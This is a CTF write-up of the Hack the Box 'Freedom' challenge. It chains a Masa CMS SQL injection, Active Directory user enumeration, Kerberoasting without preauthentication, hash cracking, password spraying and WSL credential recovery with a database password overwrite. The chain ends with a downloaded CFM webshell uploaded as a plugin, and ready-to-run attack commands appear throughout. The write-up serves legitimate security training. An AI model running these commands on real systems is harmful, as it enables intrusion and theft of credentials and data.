---
title: "Hack the Box University CTF 2024: Freedom [FullPwn]"
date: 2024-12-18T19:07:39Z
draft: false
# Originally published on Medium: https://medium.com/@theminiop/hack-the-box-university-ctf-2024-freedom-fullpwn-9d024c2f0b47
---

This past weekend (13th-15th December 2024) I competed in the Hack the Box University CTF competition as a member of [**SIGINT**](https://sigint.mx/) \[*Cyber Security Society at the University of Edinburgh*\].

Overall we ended up **19th** \[*out of 1128 teams worldwide*\], and managed to retain **1st place in the UK!**

This competition was tons of fun, and I managed to complete all of the FullPwn challenges. This write up concerns the hardest FullPwn box, **Freedom**.

{{< figure src="img-01.png" caption="Challenge Description" >}}

## Overview

Freedom was a cool FullPwn challenge which consisted of an intricate exploitation path which featured an outdated Masa CMS installation, Active Directory enumeration and abuse, windows subsystem for Linux, database tampering, and finally remote code execution through the deployment of a malicious plugin!

The below diagram demonstrates a high level overview of the path of I took to solve this challenge:

{{< figure src="img-02.png" caption="My journey to Freedom" >}}

There were a few alternative techniques which could be used solve this challenge.

Such techniques are described towards the end of this write up.

Now, lets dive into it! :)

## The Write Up

> Note: There may be discrepancies between the IP address of the target host throughout the WriteUp. This is because I compiled this article over the course of a few days — during the HTB Uni CTF after-party event.

### Initial Enumeration and Setup

After deploying the instance and conducting a few nmap scans, we get the following information:

{{< figure src="img-03.png" caption="Nmap Script and Version Scan" >}}

Clearly, we are dealing with a domain controller (DC). However, the following ports indicate additional non-default DC functionality:

- **80/tcp **: A web server which redirects to <http://freedom.htb> and a robots.txt file with interesting endpoints. This suggests that the DC is hosting some web application that may be vulnerable.
- **5985/tcp**: Windows Remote Management effectively allows for remote command line access. This is of interest to us as we may utilize this service to access the domain controller should we compromise remote management user accounts.

Additionally, this DC belongs to the domain freedom.htb and the NetBIOS name is DC1 . I also used [netexec](https://www.netexec.wiki/) to confirm this, and glean further information regarding the hosts operating system version:

```
nxc smb 10.129.231.208
```

{{< figure src="img-04.png" caption="Netexec Output" >}}

At this point, its a good idea to properly populate our /etc/hosts file. Many Active Directory pentesting tools perform domain resolution, consequently, if we don’t populate the /etc/hosts file properly, such resolutions will fail, and the tools won’t work.

{{< figure src="img-05.png" caption="Populated /etc/hosts File" >}}

It is also a good idea to synchronize our attacking machine’s time with the domain controller’s time. Kerberos preauthentication relies on shared knowledge of the current time, therefore attempting Kerberos authentication with differing client/server times will not be successful.

Time synchronization can be performed using:

```
sudo ntpdate 10.129.231.208
```

{{< figure src="img-06.png" caption="Synchronizing Client/Server Time" >}}

### A. Dumping Masa CMS Database

HTTP response headers are often helpful in establishing the technologies powering web applications. It is always worth to examine these in CTFs or engagements:

{{< figure src="img-07.png" caption="Investigating HTTP Response Headers" >}}

As observed from the figure above, the Generator header returns an interesting value, that of Masa CMS 7.4.5 . Further research into this Content Management System, specifically its version, revealed that it is susceptible to SQL injection.

{{< figure src="img-08.png" caption="Researching exploits for Masa CMS v7.4.5" >}}

Perhaps someone has done the dirty work already, and created a script or POC we can use?

{{< figure src="img-09.png" caption="Researching GitHub POC for Masa CMS SQL injection CVE" >}}

Indeed there is such a POC. Investigating this POC script revealed that it simply served as a wrapper for Ghauri — an automated SQL injection enumeration and exploitation tool.

Thus, there was no need to use this script directly, as I could just call [Ghauri](https://github.com/r0oth3x49/ghauri) directly, and supply the vulnerable endpoint and parameter identified in the script:

```
ghauri -u "http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject&object=displayregion&contenthistid=x%5c&previewID=x" -p contenthistid 
```

{{< figure src="img-10.png" caption="Automating SQL Injection Exploitation using Ghauri" >}}

The above command confirmed this vulnerability, and I could start to enumerate the underlying database. This could be performed once again using Ghauri:

{{< figure src="img-11.png" caption="Ghauri Enumeration Parameters" >}}

We can simply append any enumeration option to the end of the original command. For example, dumping the database user can be achieved using:

```
ghauri -u "http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject&object=displayregion&contenthistid=x%5c&previewID=x" -p contenthistid --current-user
```

{{< figure src="img-12.png" caption="Dumping Database User" >}}

In such SQL injection scenarios, a typical exploitation path entails recovering password hashes, subjecting them to offline brute force attacks, and then, if any of them crack, logging into the application.

Therefore, identifying the database and table which contained the user records was the next objective. A few queries later, and the following was successfully dumped:

```
ghauri -u "http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject&object=displayregion&contenthistid=x%5c&previewID=x" -p contenthistid -D dbMasaCMS -T tusers -C FName,LName,UserName,Password --dump
```

{{< figure src="img-13.png" caption="tusers Table in dbMasaCMS database — columns Fname,Lname,UserName and Password" >}}

These hashes appear to have been hashed with BCrypt. Such hashes are considerably tough to crack, and all attempts at cracking any of the above failed.

However, aside from just the hashes, the names serve as interesting bits of information, as they can be used to enumerate valid domain users.

> **Alternative Solution:** It was possible to leverage this read access to the dbMasaCMS database and achieve admin access on the Masa CMS web interface. This was done by requesting a Password Reset via the admin panel, reading the redirect URL on the database via the SQL injection, and finally visiting this URL to reset the password.

> **See -\> Admin Access to Masa CMS: Abusing Reset Password**

### **B. Enumerating Domain Users**

I opted to use [username-anarchy](https://github.com/urbanadventurer/username-anarchy) to generate a wordlist of potential usernames based on the dumped names in the *tusers* database:

```
#dumped names found in tusers

Justin Bret
Esmeralda Tylar
Admin User                                                             
Gregory Davis
George Smith
Jennifer Jones
```

```
username-anarchy -i names.txt > potential_usernames.txt
```

The generated usernames in potential_usernames.txt could then be used alongside [kerbrute](https://github.com/ropnop/kerbrute) to identify if any of them are valid. This attack works because Kerberos returns different responses for existent and non-existent users when initiating the authentication procedure.

Therefore, Kerbrute enumerates users by initiating authentication attempts for each individual user defined in the file, and then discerning valid users based on the response.

```
kerbrute userenum --dc dc1.freedom.htb -d freedom.htb potential_usernames.txt
```

{{< figure src="img-14.png" caption="Enumerating Valid Usernames using Kerbrute" >}}

As depicted above, two valid user accounts could be enumerated, those of:

```
j.bret
e.tylar
```

### C. Conducting Kerberoasting With NoPreauth

There exists an attack called [**ASREProasting**](https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/) which effectively leverages an insecure Active Directory configuration which permits users to receive valid Ticket Granting Tickets (TGT) without performing preauthentication. This setting is called **NoPreauth**.

If a user account is configured with this setting, an attacker can obtain an encrypted TGT for the respective account and subsequently subject it to an offline brute force attack. If successful, the accounts password is recovered. *The only prerequisite for this attack is knowing the accounts username.*

Therefore, we can leverage the valid users enumerated in Step B, to assess if *j.bret* or *e.tylar* have been configured with this setting:

```
impacket-GetNPUsers freedom.htb/ -dc-ip 10.129.231.208 -usersfile ./domain_users.txt
```

{{< figure src="img-15.png" caption="ASREProasting" >}}

Hashcat or john could then be used to attempt to crack this hash.

Unfortunately, this approach **did not work** in the challenge, and *e.tylar’*s password could not be recovered.

However, a user configured with **NoPreauth** can be leveraged to perform **Kerberoasting** without valid domain credentials. Therefore, the opportunity does not end here.

> This novel technique is outlined here:

> <https://www.semperis.com/blog/new-attack-paths-as-requested-sts/>

But first, lets introduce **Kerberoasting**:

[**Kerberoasting**](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/kerberoasting/) is a technique similar to the aforementioned **ASREProasting**. However, instead of targeting TGTs, it targets Service Tickets (TGS).

Service Tickets provide access to specific domain network services, as specified in their [service principal name](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names), to authenticated domain users. These Service Tickets are encrypted with the hash of the account running the service.

Therefore, **Kerberoasting** exploits weak credentials, configured on accounts with service principal names, by requesting Service Tickets for these accounts, and then subjecting them to offline hash cracking attacks.

The prerequisite for this attack involves knowing valid domain user credentials — something we don’t have at this point in the challenge.

However, we do possess a user configured with **NoPreauth**, and therefore, it is not necessary to know the respective users credentials \[*e.tylar*\].

Consequently, we can use Rubeus alongside a list of SPNs to exploit this. Service Principal Names (SPNs) typically follow this convention:

```
SERVICE_NAME/FQDN

#for example
HTTP/dc1.freedom.htb -> web based services
LDAP/dc1.freedom.htb -> ldap services
CIFS/dc1.freedom.htb -> file share services
```

I came up with a list of SPNs, reinforced through the help of ChatGPT, and then used Rubeus to conduct this attack \[*this was done from my Windows Attack Box*\]:

```
Rubeus.exe kerberoast /nopreauth:e.tylar /domain:freedom.htb /dc:dc1.freedom.htb /nowrap /spns:spnlist.txt
```

{{< figure src="img-16.png" caption="Kerberoasting Attack via an Account with Preauth Disabled" >}}

> Note: This attack can also be conducted using impacket from a Linux box:

```
impacket-GetUserSPNs freedom.htb/ -no-preauth e.tylar -usersfile ~/domain_users.txt
```

A few hashes were returned, however the first one keenly stood out.

The first hash, identified by the SPN HTTP/dc1.freedom.htb, was of particular interest because it had been encrypted using RC4. RC4 hashes are substantially faster to crack, compared to AES counterparts.

> Kerberos tickets can be encrypted with one of three methods:

> **- RC4**: Uses the NTLM hash as the RC4 encryption key. Identified by **\$23** in the hash. This method is considered less secure by modern standards.

> **- AES-128**: Uses a 128-bit session key derived from the user’s password. Identified by **\$18**.

> **- AES-256**: Uses a 256-bit session key derived from the user’s password. Identified by **\$19**.

Consequently, I opted to try crack this hash first, and this attempt was successful!

```
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```

{{< figure src="img-17.png" caption="Cracking Kerberoast Hash" >}}

### D. Moving Laterally

Armed with a valid password, I conducted a quick password spray to determine if this password belonged to any of the two users:

```
nxc smb dc1.freedom.htb -u ./domain_users.txt -p 'swordsoffreedom' --continue-on-success 
```

This password was valid for the *j.bret* user:

{{< figure src="img-18.png" caption="Password Spraying Attack" >}}

With valid user credentials, it is now possible to enumerate the domain further. A useful command for establishing our current users context within the domain is the following:

```
nxc ldap dc1.freedom.htb -u 'j.bret' -p 'swordsoffreedom' -M whoami
```

{{< figure src="img-19.png" caption="LDAP whoami" >}}

From the above output, it is evident that *j.bret* is a member of the **Remote Management Users** group, meaning they should have sufficient access to login using Windows Remote Management \[WinRM\] (tcp/5985):

```
evil-winrm -i dc1.freedom.htb -u j.bret -p 'swordsoffreedom'
```

{{< figure src="img-20.png" caption="Using evil-winrm to log into DC1" >}}

As observed from above, this was true, and the user flag was obtained.

### E. Enumerating Windows Subsystem for Linux

Some initial enumeration of the C:\\ drive revealed the presence of Windows Subsystem for Linux (WSL).

{{< figure src="img-21.png" caption="Enumerating WSL Directory in C:" >}}

Furthermore, it appears that the WSL installation in play was using Ubuntu as the Operating System. Additionally, WSL version 1 was being utilized. The difference between WSL version 1 and version 2 can be thoroughly assessed [here](https://learn.microsoft.com/en-us/windows/wsl/compare-versions).

In short, WSL version 1 is a compatibility layer. This layer effectively converts Linux syscalls to Windows syscalls, while WSL version 2 utilizes a lightweight virtual machine running a real Linux kernel. Consequently, WSL v1 use the native file system, while WSL v2 leverages a virtual hard disk (VHDX) to store its file system.

{{< figure src="img-22.png" caption="Enumerating C:WSLUbuntu Directory" >}}

The C:\WSL\Ubuntu\rootfs directory listed a typical root Linux filesystem, thereby indicating that we are dealing with WSL 1:

{{< figure src="img-23.png" caption="Enumerating WSL root File System" >}}

Investigating the deployment of Masa CMS revealed that it was powered by an underlying [Lucee Server](https://www.lucee.org/). Furthermore, the below Lucee configuration file contained an encrypted data source password which was used to achieve database connections with the MySQL dbMasaCMS database (*the very same one I dumped in* ***A. Dumping Masa CMS Database***):

\WSL\Ubuntu\rootfs\opt\lucee\tomcat\lucee-server\context\\.CFConfig.json

{{< figure src="img-24.png" caption="Encrypted Data Source Password in Lucee Configuration File" >}}

Some [research](https://dev.lucee.org/t/datasource-password-in-application-cfc/10291/11) showed that this password could be recovered using the following utility:

[FORGEBOX: Lucee Pasword Util](https://www.forgebox.io/view/lucee-password-util)

This utility was essentially a library which implemented methods used to play around with hashes and encrypted datasource passwords in Lucee installations. Therefore, in order to use it, I had to spin up a small CFML environment, in which I could import the module and call its methods.

This technique involved [installing command box](https://www.ortussolutions.com/products/commandbox#download):

```
sudo dpkg -i <command_box.dpkg>
```

> **CommandBox** is a **command-line tool** and **package manager** specifically designed for CFML (ColdFusion Markup Language) development. It streamlines and automates workflows for ColdFusion/CFML projects and servers, similar to tools like Node.js **npm** or Python’s **pip**, but tailored for CFML environments.

> \- ChatGPT

Following the above, we can install the module, and create a script which would utilize the lucee-password-util.decryptDataSource() method to recover the plaintext data source connection password.

```
#start up commandbox
box
#install module
box install lucee-password-util
```

The script in question was the following, and I saved it under decryptPassword.cfm:

```
<cfscript>
    passwordUtil = createObject("component", "modules.lucee-password-util.models.PasswordManager");
    encryptedPassword = "b1d058779de369f6e3b92fcf67709c62667429c6001f8a1544b589557298aec1";
    decryptedPassword = passwordUtil.decryptDataSource(encryptedPassword);
    writeOutput("Decrypted Password: " & decryptedPassword);
</cfscript>
```

Upon saving the script and visiting its respective endpoint in a browser, the password was displayed:

{{< figure src="img-25.png" caption="Recovered Database Password for Lucee Data Source" >}}

### F. Modifying Masa CMS Admin Password

With this newfound access, we can authenticate to the MySQL database using the recovered credentials.

> Note: The MySQL service was only listening on the loopback interface. Therefore, a reverse port forwarding technique must be used. I used chisel.

```
proxychains -q mysql -h 127.0.0.1 -u lucee -p
```

{{< figure src="img-26.png" caption="Connecting and Authenticating to MySQL" >}}

Finally, we can [generate](https://bcrypt-generator.com/) a known BCrypt hash and update the admin users password:

{{< figure src="img-27.png" caption="Generating BCrypt Hash for ‘hello’" >}}

```
UPDATE tusers
SET password = "$2a$10$KxE3f5yVHpfTF0YAVoI86.qkmghcqo709RU6QYYIThLgkSktnyCDi"
WHERE Email="admin@freedom.htb";
```

{{< figure src="img-28.png" caption="Updating Admins BCrypt Password hash" >}}

It was then possible to login using admin : hello .

### G. Uploading Malicious Plugin

Logging into the admin web interface for Masa CMS revealed functionality which allows for the addition of plugins:

{{< figure src="img-29.png" caption="Add Plugin Admin Masa CMS Interface" >}}

Plugins define additional functionality that builds on the features of the CMS. Considering the CMS is powered by CFML, my first thought was to simply zip a cfm webshell, and upload the resultant file. The MasaCMS is running as root on WSL, therefore the webshell must execute commands in a Linux environment.

Some googling later and I found the following webshell:

[pentest-tools/shells/webshell.cfm at master · reider-roque/pentest-tools](https://github.com/reider-roque/pentest-tools/blob/master/shells/webshell.cfm)

I then proceeded to download it and zip it:

```
wget https://raw.githubusercontent.com/reider-roque/pentest-tools/refs/heads/master/shells/webshell.cfm
zip webshell.zip webshell.cfm
```

{{< figure src="img-30.png" caption="Zipping CFM Webshell" >}}

Next, I uploaded and deployed it on Masa CMS:

{{< figure src="img-31.png" caption="Malicious Plugin Deploy Error" >}}

The 500 message describes a *missinginclude* error which has something to do with the uploaded plugins structure. More specifically, the absence of a valid plugin/config.xml.cfm file causes some issues.

> Note: Official MasaCMS Plugin Format:

> <https://docs.murasoftware.com/v6/back-end/plugins/creating-plugins-in-mura-cms/>

With that being said, the webshell still works, and I could access it via:

/plugins/16/webshell.cfm

{{< figure src="img-32.png" caption="Interacting with Web Shell" >}}

But why does it still work? What about the error?

Well, even though the plugin fails to deploy, as it does not possess the valid prerequisite files/structure, the plugin files successfully get uploaded. We can confirm this through our access to the local file system:

{{< figure src="img-33.png" caption="Investigating Local File System" >}}

As such, we can visit its respective URL, and the underlying server will execute it as valid CFML code — thereby achieving code execution when we pass our command parameter.

Finally, it is possible to recover the flag as the C:\\ drive gets mounted on the **/mnt/c** directory.

{{< figure src="img-34.png" caption="Recovering flag" >}}

## Alternative Solutions

This section discusses alternative ways in which the challenge could be solved, or at least progressed to the next level.

### Admin Access to Masa CMS: Abusing Reset Password

The table tredirects in the database dbMasaCMS would get populated by any password reset attempts made for valid emails.

Considering we possess read access to this table, it was possible to initiate a reset password attempt for any user — including admin, dump the tredirects table, and subsequently visit the recovered URL to reset admins password.

1.  Dumping tredirects table prior to triggering reset password:

As observed through the figure below, zero entries are returned.

```
ghauri -u "http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject&object=displayregion&contenthistid=x%5c&previewID=x" -p contenthistid -D dbMasaCMS -T tredirects --dump --fresh-queries 
```

{{< figure src="img-35.png" caption="Dumped tredirects table with zero entries — prior to reset password request" >}}

2\. Issuing a reset password request for admin:

{{< figure src="img-36.png" caption="Performing a Reset Password Request for the Admin User #1" >}}

{{< figure src="img-37.png" caption="Performing a Reset Password Request for the Admin User #2" >}}

3\. Dumping tredirects table after triggering reset password:

{{< figure src="img-38.png" caption="Dumped tredirects table with one entry — after reset password request" >}}

After successfully performing a password reset attempt, this table has been populated with an entry.

4\. Finally, we can visit the URL to reset admin password and edit their profile.

```
URL : http://freedom.htb/admin/?muraAction=cEditProfile.edit&siteID=default&returnID=23A93F75-C999-4816-88EC8F17D502E91C&returnUserID=75296552-E0A8-4539-B1A46C806D767072
```

{{< figure src="img-39.png" caption="Admin Edit Profile Web Interface" >}}

From here, it was possible to perform the same malicious plugin exploitation to recover the root and user flag — I believe this to be an unintended solution.

### Privilege Escalation: Leaked Handles

This is a very cool approach and an attack vector which I missed. There existed a Health Check service which leaked an exploitable handle with *ALL_ACCESS* target process rights.

This could effectively be abused to achieve a shell as SYSTEM.

> I do not cover the steps here, however int3x made a nice write-up regarding this exploitation procedure:

> <https://github.com/int3x/ctf-writeups/blob/main/HTB%20Uni-CTF%202024/Freedom/README.md>

Considering the nature of the root flag -\> HTB{l34ky_h4ndl3rs_4th3_w1n}, this is almost certainly the intended privilege escalation step.

## Conclusion

I really enjoyed the challenge, particularly the steps required to achieve user access.

Kudos to Hack the Box for yet another amazing University CTF edition.

Additional kudos to SIGINT and all its diligent members who battled and largely neglected their health for 2–3 days.

Thanks for reading! :)
